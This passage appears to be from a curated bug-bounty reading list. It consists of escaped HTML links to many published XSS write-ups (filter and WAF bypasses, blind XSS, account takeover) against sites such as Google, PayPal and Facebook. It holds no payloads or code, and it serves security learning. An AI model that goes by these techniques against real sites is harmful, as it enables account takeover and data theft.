&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cyberzombie.in/stored-xss-on-indeed/&#34;&gt;Stored XSS on indeed &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saadahmedx/self-xss-to-evil-xss-bcf2494a82a4&#34;&gt;Self XSS to evil XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/&#34;&gt;How a classical XSS can lead to persistent ATO vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://visat.me/security/reflected-xss-in-tokopedia-train-ticket/&#34;&gt;Reflected XSS in tokopedia train ticket &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@osamaavvan/bypassing-xss-filter-and-stealing-user-credit-card-data-100f247ed5eb&#34;&gt;Bypassing XSS filter and stealing user credit card data&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://websecblog.com/vulns/googleplex-com-blind-xss/&#34;&gt;Googleplex.com blind XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://noobe.io/articles/2019-06/reflected-xss-on-error-page&#34;&gt;Reflected XSS on error page &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pwnsec.ninja/2019/06/06/how-i-was-able-to-get-private-ticket-response-panel-and-fortigate-web-panel-via-blind-xss/&#34;&gt;How I was able to get private ticket response panel and fortigate web panel via blind XSS &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/unicode-vs-waf-xss-waf-bypass-128cd9972a30&#34;&gt;Unicode vs WAF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nandwanajatin25/story-of-a-uri-based-xss-with-some-simple-google-dorking-e1999254aa55&#34;&gt;Story of URI based XSS with some simple google dorking &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@matarpan33r/stored-xss-on-edmodo-67b244824fa5&#34;&gt;Stored XSS on edmodo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gauravnarwani.com/xssed-my-way-to-1000/&#34;&gt;XSSed my way to 1000&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@fbotes2/try-harder-for-xss-7aa3657255a1&#34;&gt;Try harder for XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@momenbasel/from-parameter-pollution-to-xss-d095e13be060&#34;&gt;From parameter pollution to XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.komodosec.com/post/mime-sniffing-xss&#34;&gt;MIME sniffing XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@kang_ali/stored-xss-on-techprofile-microsoft-d21757588cc1&#34;&gt;Stored XSS on techprofile Microsoft &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/&#34;&gt;Tale of a wormable Twitter XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/&#34;&gt;XSS attacks google bot index manipulation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/a-bugz-life/from-reflected-xss-to-account-takeover-showing-xss-impact-9bc6dd35d4e6&#34;&gt;From Reflected XSS to Account takeover &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html&#34;&gt;Stealing local storage data through XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f&#34;&gt;CSRF attack can lead to stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/xss-reflected-xss-bypass-filter-de41d35239a3&#34;&gt;XSS Reflected (filter bypass)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bughunter.sec7/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program-8914a31339a9&#34;&gt;XSS protection bypass on hackerone private program&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ZishanAdThandar/just-5-minute-to-get-my-2nd-stored-xss-on-edmodo-com-fe2ee559e00d&#34;&gt;Just 5 minutes to get my 2nd Stored XSS on edmodo.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jayateerthag/multiple-xss-in-skype-com-2-18cfed39edbd&#34;&gt;Multiple XSS in skype.com &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@daniel.thatcher/obtaining-xss-using-moodle-features-and-minor-bugs-2035665989cc&#34;&gt;Obtaining XSS using moodle featured and minor bugs &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bughunter.sec7/xss-403-forbidden-bypass-akamai-security-write-up-b341f588efb5&#34;&gt;XSS on 403 forbidden bypass akamai WAF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@heinthantzin/how-i-was-able-to-turn-self-xss-into-reflected-xss-850e3d5a2beb&#34;&gt;How I was turn self XSS into reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gauravnarwani.com/a-tale-of-3-xss/&#34;&gt;A Tale of 3 XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bughunter.sec7/stored-xss-on-google-com-e7ac12f03b8e&#34;&gt;Stored XSS on Google.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bughunter.sec7/stored-xss-in-the-guides-gameplayversion-www-dota2-com-775fa9a1889b&#34;&gt;Stored XSS in the Guides gameplaersion (www.dota2.com)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://buer.haus/2015/01/21/admin-google-com-reflected-cross-site-scripting-xss/&#34;&gt;Admin google.com reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.it-securityguard.com/bugbounty-paypal-stored-xss-security-bypass/&#34;&gt;Paypal Stored security bypass &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.it-securityguard.com/bugbounty-paypal-dom-xss-main-domain/&#34;&gt;Paypal DOM XSS main domain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.it-securityguard.com/bugbounty-the-5000-google-xss&#34;&gt;Bugbounty : The 5k$ Google XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://buer.haus/2014/06/16/facebook-stored-cross-site-scripting-xss-badges/&#34;&gt;Facebook stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://thehackerblog.com/ebay-mobile-reflected-xss-disclosure-writeup/index.html&#34;&gt;Ebay mobile reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/&#34;&gt;Magix bugbounty XSS writeup&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/&#34;&gt;Abusing CORS for an XSS on flickr &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://manuel-sousa.blogspot.com/2013/11/xss-google-groups-groupsgooglecom.html&#34;&gt;XSS on google groups &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://blog.shashank.co/2013/11/oracle-xss.html&#34;&gt;Oracle XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/articles/content-types-and-xss-facebook-studio/&#34;&gt;Content types and XSS Facebook Studio&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bitquark.co.uk/blog/2013/07/19/admob_creative_image_xss&#34;&gt;Admob Creative image XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bitquark.co.uk/blog/2013/07/03/amazon_packaging_feedback_xss&#34;&gt;Amazon Packaging feedback XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2013/04/paypal-bug-bounty-paypaltech-com-xss/&#34;&gt;PaypalTech XSS &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/&#34;&gt;Persistent XSS on my world&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/securifyinc.com/vrp-writeups/gsuite/bookmark-xss-device-management&#34;&gt;Google VRP XSS in device management&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/xsses&#34;&gt;Google VRP XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/blind-xss&#34;&gt;Google VRP Blind XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/securifyinc.com/vrp-writeups/waze/waze-xss&#34;&gt;WAZE XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/referer-based-xss-52aeff7b09e7&#34;&gt;Referer Based XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://labs.detectify.com/2017/07/27/how-we-invented-the-tesla-dom-doom-xss/&#34;&gt;How we invented the Tesla DOM XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/stored-xss-on-rockstar-game-c008ec18d071&#34;&gt;Stored XSS on rockstar game&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/how-i-was-able-to-bypass-strong-xss-protection-in-well-known-website-imgur-com-8a247c527975&#34;&gt;How I was able to bypass strong XSS protection in well known website imgur.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e&#34;&gt;Self XSS to Good XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2&#34;&gt;That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/xss-using-dynamically-generated-js-file-a7a10d05ff08&#34;&gt;XSS using dynamically generated js file&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/bypassing-xss-filtering-at-anchor-tags-706dde7b8090&#34;&gt;Bypassing XSS filtering at anchor Tags&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://wesecureapp.com/blog/xss-by-tossing-cookies/&#34;&gt;XSS by tossing cookies&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.paulosyibelo.com/2017/07/coinbase-angularjs-dom-xss-via-kiteworks.html&#34;&gt;Coinbase angularjs dom XSS via kiteworks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ahussam.me/Medium-content-spoofing-xss/&#34;&gt;Medium Content spoofing and XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/&#34;&gt;Managed Apps and music a tale of two XSSes in Google play&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5&#34;&gt;Making an XSS triggered by CSP bypass on twitter &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/&#34;&gt;Escalating XSS in phantomjs image rendering to SSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/reflected-xss-vulnerability-in-simplerisk/&#34;&gt;Reflected XSS in Simplerisk&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/stored-xss-in-the-heart-of-the-russian-email-provider-giant-mail-ru/&#34;&gt;Stored XSS in the heart of the russian email provider&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/&#34;&gt;How I built an XSS worm on atmail&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.witcoat.com/2018/05/30/xss-on-bugcrowd-and-so-many-other-websites-main-domain/&#34;&gt;XSS on bugcrowd and so many other websites main domain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/write-ups/godaddy-xss-affects-parked-domains-redirector-processor/&#34;&gt;Godaddy XSS affects parked domains redirector Processor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/site/bugbountybughunter/home/stored-xss-in-google-image-search&#34;&gt;Stored XSS in Google image search&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ysx.me.uk/a-pair-of-plotly-bugs-stored-xss-and-aws-metadata-ssrf/&#34;&gt;A pair of plotly bugs stored XSS abd AWS metadata&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.ettic.ca/near-universal-xss-in-mcafee-web-gateway-cf8dfcbc8fc3&#34;&gt;Near universal XSS in mcafee web gateway&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.jonbottarini.com/2017/03/16/penetrating-pornhub-xss-vulns-galore-plus-a-cool-shirt/&#34;&gt;Penetrating Pornhub XSS vulns&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff&#34;&gt;How I found a 5000 Google maps XSS by fiddling with protobuf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/&#34;&gt;Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ysx.me.uk/lightweight-markup-a-trio-of-persistent-xss-in-gitlab/&#34;&gt;Lightwight markup a trio of persistent XSS in gitlab&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitehatnepal.tumblr.com/post/153333332112/xssonebay&#34;&gt;XSS ONE BAY&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guptashubham.com/svg-xss-in-unifi-v5-0-2/&#34;&gt;SVG XSS in unifi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guptashubham.com/stored-xss-in-unifi-v4-8-12-controller/&#34;&gt;Stored XSS in unifi V4.8.12 controller&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://httpsonly.blogspot.com/2016/08/turning-self-xss-into-good-xss-v2.html&#34;&gt;Turning self XSS into good XSS v2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guptashubham.com/swf-xss-dom-based-xss/&#34;&gt;SWF XSS DOM Based XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guptashubham.com/xss-filter-bypass-in-yahoo-dev-flurry-com/&#34;&gt;XSS filter bypass in Yahoo Dev flurry&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guptashubham.com/xss-on-flickr/&#34;&gt;XSS on Flickr&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/two-vulnerabilities-makes-an-exploit-xss-and-csrf-in-bing-cd4269da7b69&#34;&gt;Two vulnerabilities makes an exploit XSS and csrf in bing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/runkeeper-stores-xss-vulnerability/&#34;&gt;Runkeeper stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/&#34;&gt;Google sleeping XSS awakens 5k bounty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/index.html&#34;&gt;Poisoning the well compromising godaddy customer support with blind XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/articles/uber-turning-self-xss-into-good-xss/&#34;&gt;UBER turning self XSS to good XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/articles/xss-on-facebook-via-png-content-types/&#34;&gt;XSS on facebook via png content types&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ahussam.me/Cloudflare-xss/&#34;&gt;Cloudflare XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://zombiehelp54.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html&#34;&gt;How I found XSS Vulnerability in Google &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://matatall.com/xss/rce/bugbounty/2015/09/08/xss-to-rce.html&#34;&gt;XSS to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ahussam.me/One-payload-to-xss-them/&#34;&gt;One payload to XSS them all&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd&#34;&gt;Self XSS on komunitas&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bughunter.sec7/reflected-xss-on-alibabacloud-com-4e652fcca22f&#34;&gt;Reclected XSS on alibabacloud&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd&#34;&gt;Self XSS on komunitas bukalapak&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@paulorcchoupina/a-real-xss-in-olx-7727ae89c640&#34;&gt;A real XSS in OLX&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@80vul/from-http-domain-to-res-domain-xss-by-using-ie-adobes-pdf-activex-plugin-9f2a72a87aff&#34;&gt;Self XSS using IE adobes&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html&#34;&gt;Stealing local storage through XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://omespino.com/write-up-1000-usd-in-5-minutes-xss-stored-in-outlook-com-ios-browsers/&#34;&gt;1000 USD in 5mins Stored XSS in Outlook&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@abaykandotcom/olx-bug-bounty-reflected-xss-adb3095cd525&#34;&gt;OLX reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ZishanAdThandar/my-first-stored-xss-on-edmodo-com-540a33349662&#34;&gt;My first stored XSS on edmodo.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@GeneralEG/hack-your-form-new-vector-for-blind-xss-b7a50b808016&#34;&gt;Hack your form new vector for BXSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@newp_th/how-i-find-blind-xss-vulnerability-in-redacted-com-33af18b56869&#34;&gt;How I found Blind XSS vulnerability in redacted.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@vladimirmetnew/3-xss-in-protonmail-for-ios-95f8e4b17054&#34;&gt;3 XSS in protonmail for iOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@valakeyur/xss-in-edmodo-within-5-minute-my-first-bug-bounty-889e3da6167d&#34;&gt;XSS in edmodo wihinin 5 mins&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/02/still-work-redirect-yahoo-subdomain-xss.html&#34;&gt;Stil work redirect Yahoo subdomain XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://5alt.me/2019/02/xss-in-azure-devops/&#34;&gt;XSS in azure devOps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@modam3r5/reflected-xss-at-https-photos-shopify-com-ea696db3915c&#34;&gt;Shopify reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://apapedulimu.click/multiple-stored-xss-on-tokopedia/&#34;&gt;Muliple Stored XSS on tokopedia&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@futaacmcyber/stored-xss-on-edmodo-11a3fbc6b6d0&#34;&gt;Stored XSS on edmodo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@rohanchavan/a-unique-xss-scenario-1000-bounty-347f8f92fcc6&#34;&gt;A unique XSS scenario 1000 Bounty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ChandSingh/protonmail-xss-stored-b733031ac3b5&#34;&gt;Protonmail XSS Stored&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nahoragg/chaining-tricky-oauth-exploitation-to-stored-xss-b67eaea4aabd&#34;&gt;Chaining tricky ouath exploitation to stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.saycure.io/2019/01/24/antihack-xss-2-php-upload/&#34;&gt;Antihack XSS to php uplaod&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sudhanshur705/reflected-xss-in-zomato-f892d6887147&#34;&gt;Reflected XSS in zomato&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@friendly_/xss-through-swf-file-4f04af7b0f59&#34;&gt;XSS through SWF file&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://generaleg0x01.com/2019/01/13/hackyourform-bxss/&#34;&gt;Hackyourform BXSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@thejuskrishnan911/reflected-xss-on-asus-568ce0541171&#34;&gt;Reflected XSS on ASUS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@hariharan21/stored-xss-via-alternate-text-at-zendesk-support-8bfee68413e4&#34;&gt;Stored XSS via Alternate text at zendesk support&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@parthshah14031998/how-i-stumbled-upon-a-stored-xss-my-first-bug-bounty-story-2793300d82bb&#34;&gt;How I stumbled upon a stored XSS : my first bug bounty story&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/cookie-based-self-xss-to-good-xss-d0d1ca16dd0e&#34;&gt;Cookie based Self XSS to Good XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf&#34;&gt;Reflected XSS on amazon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.compass-security.com/2018/12/xss-worm-a-creative-use-of-web-application-vulnerability/&#34;&gt;XSS worm : a creative use of web application vulnerability &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://websecblog.com/vulns/google-code-in-xss/&#34;&gt;Google code in XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sampanna/self-xss-in-indeed-com-e0c99c104cba&#34;&gt;Self XSS on indeed.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.secu.ninja/2018/12/04/how-to-accidentally-find-a-xss-in-protonmail-ios-app/&#34;&gt;How I accidentally found XSS in Protonmail for iOS app&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@0ktavandi/xml-xss-in-yandex-ru-by-accident-7e63c692b4c0&#34;&gt;XML XSS in yandex.ru by accident&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackerinside.me/2018/11/critical-stored-xss-vulnerability.html&#34;&gt;Critical Stored XSS vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308&#34;&gt;XSS bypass using META tag in realestate.postnl.nl &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sameerphad72/edmodo-xss-bug-9c0fc9bdd0bf&#34;&gt;Edmodo XSS bug&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://portswigger.net/blog/xss-in-hidden-input-fields&#34;&gt;XSS in hiden input fields&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/&#34;&gt;How I discovered XSS that affected over 20 uber subdomains&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/dom-based-xss-or-why-you-should-not-rely-on-cloudflare-too-much-a1aa9f0ead7d&#34;&gt;DOM based XSS or why you should not rely on cloudflare too much&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@tim.kent/xss-in-dynamics-365-25c800aac473&#34;&gt;XSS in dynamics 365&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ariffadhlullah2310/xss-deface-with-html-and-how-to-convert-the-html-into-charcode-f0c62dd5ef3f&#34;&gt;XSS deface with html and how to convert the html into charcode&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@agrawalsmart7/cookie-based-injection-xss-making-exploitable-with-out-exploiting-other-vulns-81132ca01d67&#34;&gt;Cookie based injection XSS making explitable with exploiting other vulns&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.itsecguy.com/xss-with-put-in-ghost-blog/&#34;&gt;XSS with put in ghost blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://labs.detectify.com/2018/10/19/xss-using-a-bug-in-safari-and-why-blacklists-are-stupid/&#34;&gt;XSS using a Bug in safari and why blacklists are stupid&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 